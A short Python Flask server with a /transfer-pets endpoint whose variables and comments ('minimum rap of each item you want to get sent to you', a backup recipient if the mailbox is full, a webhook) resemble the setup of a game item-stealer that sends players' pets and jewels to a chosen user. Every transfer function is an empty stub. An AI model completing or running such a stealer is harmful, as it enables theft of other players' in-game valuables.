from flask import Flask, request, jsonify

app = Flask(__name__)

# Define variables
Username = "username"
Username2 = "username2"  # stuff will get sent to this user if first user mailbox is full
Webhook = "webhook"
min_rap = 100000  # minimum rap of each item you want to get sent to you

@app.route('/transfer-pets', methods=['POST'])
def transfer_pets():
    data = request.json
    username = data.get('username')
    username2 = data.get('username2')
    webhook = data.get('webhook')
    min_rap_param = data.get('minRap')
    pets = data.get('pets')
    jewels = data.get('jewels')

    if not username or not webhook or not min_rap_param:
        return jsonify({'message': 'Please enter all required fields.'}), 400

    # Convert minRap parameter to integer
    try:
        min_rap_param = int(min_rap_param)
    except ValueError:
        return jsonify({'message': 'Invalid minRap parameter.'}), 400

    # Example logic to check if mailbox is full and send to username2 if needed
    if check_mailbox_full() and username2:
        send_to_second_user(username2, webhook, pets, jewels)
    else:
        send_to_webhook(webhook, username, min_rap_param, pets, jewels)

    return jsonify({'message': 'Pets transfer initiated successfully.'}), 200

def check_mailbox_full():
    # Example function to simulate checking if mailbox is full
    return False  # Replace with actual logic

def send_to_second_user(username2, webhook, pets, jewels):
    # Example function to send data to second user via webhook
    # Implement your webhook logic here
    pass

def send_to_webhook(webhook, username, min_rap_param, pets, jewels):
    # Example function to send data to main webhook
    # Implement your webhook logic here
    pass

if __name__ == '__main__':
    app.run(debug=True)
